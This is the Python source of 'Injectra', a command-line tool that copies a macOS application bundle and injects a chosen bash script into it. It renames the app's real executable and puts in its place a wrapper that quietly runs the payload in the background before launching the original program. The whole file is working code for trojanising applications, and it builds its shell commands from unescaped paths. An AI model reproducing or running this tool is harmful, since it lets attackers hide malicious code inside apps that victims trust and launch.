### Made by Taguar258 | Licence MIT ###

import sys
import subprocess
import os
from os import path
import argparse

# Colors
C_None = "\x1b[0;39m"
C_Blink = "\x1b[5;39m"
C_Bold = "\x1b[1;39m"
C_Red = "\x1b[31m"
C_Green = "\x1b[32m"
C_Yellow = "\x1b[33m"
C_Blue = "\x1b[34m"
#C_Cyan = "\x1b[36m"
#C_Magenta = "\x1b[35m"
C_BRed = "\x1b[1;31m"
C_BGreen = "\x1b[1;32m"
C_BYellow = "\x1b[1;33m"
C_BBlue = "\x1b[1;34m"
#C_BCyan = "\x1b[1;36m"
#C_BMagenta = "\x1b[1;35m"

parser = argparse.ArgumentParser()
parser.add_argument('-a', '--app', type=str, nargs=1, required=True, help='OSX target application')
parser.add_argument('-i', '--inject', type=str, nargs=1, required=True, help='Bash script to inject')
parser.add_argument('-o', '--output', type=str, nargs=1, required=True, help='Output for the new application')

def banner():
	bannertxt = """ 
---------------------------------------------------------------- 
@@@ @@@  @@@     @@@ @@@@@@@@  @@@@@@@ @@@@@@@ @@@@@@@   @@@@@@  
@@! @@!@!@@@     @@! @@!      !@@        @!!   @@!  @@@ @@!  @@@ 
!!@ @!@@!!@!     !!@ @!!!:!   !@!        @!!   @!@!!@!  @!@!@!@! 
!!: !!:  !!! .  .!!  !!:      :!!        !!:   !!: :!!  !!:  !!! 
:   ::    :  ::.::   : :: ::   :: :: :    :     :   : :  :   : : 
---------------------------------------------------------------- 
               Made by Taguar258 | MIT 2020                      
"""
	bannertxt = bannertxt.replace("@", C_BRed + "@")
	bannertxt = bannertxt.replace(":", C_BGreen + ":")
	bannertxt = bannertxt.replace("!", C_BYellow + "!")
	bannertxt = bannertxt.replace(".", C_BYellow + ".")
	bannertxt = bannertxt.replace(" ", C_None + " ")
	bannertxt = bannertxt.replace("-", C_Bold + "-")
	print(bannertxt)

def get_app_name(app, output):
	try:
		os.chdir(output + "/Contents/")
	except:
		print(C_BRed + "[!] Cannot access application." + C_None)
		quit()
	try:
		info = open("Info.plist", "r").read()
		info = info.split("<key>CFBundleExecutable</key>")[1]
		info = info.split("</string>")[0]
		info = info.split("<string>")[1]
		appname = info
	except:
		print(C_BRed + "[!] Cannot determin application name." + C_None)
		appname = input("[?] Enter original application name: ")
	return appname

banner()
args = parser.parse_args()
args.inject[0] = path.abspath(args.inject[0])
args.app[0] = path.abspath(args.app[0])
args.output[0] = path.abspath(args.output[0])


print("[i] Searching for application.")
if path.isdir(args.app[0]):
	print("[+] Found application: %s" % args.app[0])
else:
	print(C_BRed + "[!] Cannot find application." + C_None)
	quit()
#print("[i] Check if application is writable.")
#if os.access(args.app[0], os.W_OK):
#	print("[+] Application is writable.")
#else:
#	print(C_BRed + "[!] Cannot write application." + C_None)
#	quit()

print("[i] Searching for script.")
if path.isfile(args.inject[0]):
	print("[+] Found script: %s" % args.inject[0])
else:
	print(C_BRed + "[!] Cannot find script." + C_None)
	quit()
print("[i] Check if script is readable.")
if os.access(args.inject[0], os.R_OK):
	print("[+] Script is readable.")
else:
	print(C_BRed + "[!] Cannot read script." + C_None)
	quit()
print("[i] Check if output path is writable.")
try:
	output = args.output[0].split("/")
	output1 = ("/".join(output[:(len(output) - 1)]))
	output2 = ("." + ("/".join(output[-1:])))
	if output1 != "":
		output2 = "/" + output2
	output = (output1 + output2)
except:
	print(C_BRed + ("[!] Cannot get output path: %s" % output) + C_None)
	quit()
print("[i] Copying application...")

if path.isdir(output) or path.isdir(args.output[0]):
	print(C_BRed + ("[!] Output directory already exists: %s" % output) + C_None)
	quit()
try:
	subprocess.call(("cp -r '%s' '%s'" % (args.app[0], output)), shell=True)
	print("[+] Application sucessfully cloned.")
except:
	print(C_BRed + ("[!] Cannot write output: %s" % output) + C_None)
	quit()

print("[i] Injecting script...")
print("[i] Determin application name.")
if args.app[0][-1:] == "/":
	appname = get_app_name(args.app[0][:len(args.app[0]) - 1], output)
else:
	appname = get_app_name(args.app[0], output)
print("[+] Application name sucessfully analyzed: %s" % appname)
print("[i] Change start order.")
try:
	os.chdir("MacOS/")
except:
	print(C_BRed + "[!] Cannot access applications main file." + C_None)
	quit()
try:
	subprocess.call(("cp '%s' payload" % args.inject[0]), shell=True)
except:
	print(C_BRed + "[!] Cannot insert injection." + C_None)
	quit()
try:
	subprocess.call(("mv '%s' 'injectra'" % appname), shell=True)
except:
	print(C_BRed + "[!] Cannot rearrange start order." + C_None)
	quit()
try:
	subprocess.call(('echo \'#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; $DIR/payload & $DIR/injectra\' > "%s"' % appname), shell=True)
except:
	print(C_BRed + "[!] Cannot write new start order." + C_None)
	quit()
try:
	subprocess.call(("chmod +x injectra ; chmod +x payload ; chmod +x '%s'" % appname), shell=True)
except:
	print(C_BRed + "[!] Cannot make injection executable." + C_None)
	quit()
try:
	os.chdir("../../../")
	subprocess.call(("mv '%s' '%s'" % (output, args.output[0])), shell=True)
except:
	print(C_BRed + "[!] Cannot make application visible." + C_None)
	quit()
print("[+] Injection sucessful.")


### Made by Taguar258 | Licence MIT ###